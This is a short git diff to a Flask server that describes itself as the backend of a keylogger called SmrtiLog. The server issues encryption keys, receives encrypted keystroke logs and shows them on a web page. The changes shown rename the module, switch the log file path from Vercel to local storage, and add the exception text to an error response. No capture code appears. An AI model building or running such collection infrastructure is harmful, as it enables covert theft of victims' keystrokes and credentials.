@@ -1,9 +1,10 @@
 """
-Keylogger Server by SudoHopeX
+SmrtiLog - Keylogger Server by SudoHopeX
 
 A Flask server to handle encrypted logs from a keylogger.
 Provides endpoints to get encryption keys and receive encrypted logs.
 Also includes a web interface to view and clear received logs.
+All Logs are temporarily stored on vercel & removed by vercel
 """
 
 """
@@ -46,7 +47,8 @@ app = Flask(__name__)
 # Format: {key_id: (key, timestamp)}
 active_keys = {}
 KEY_EXPIRY_TIME = 360   # 6 minutes in seconds
-LOG_FILE = "/tmp/received_logs.txt"  # received logs file path only for vercel deployment
+# LOG_FILE = "/tmp/received_logs.txt"  # received logs file path only for vercel deployment
+LOG_FILE = "files/received_logs.txt"  # received logs file path only for local deployment
 
 def cleanup_old_keys():
     """Remove expired keys periodically"""
@@ -133,7 +135,7 @@ def home():
     except FileNotFoundError:
         content = "No logs found."
     except Exception as e:
-        return f"Error reading log file", 500
+        return f"Error reading log file: {e}", 500
 
 
     html_template = """
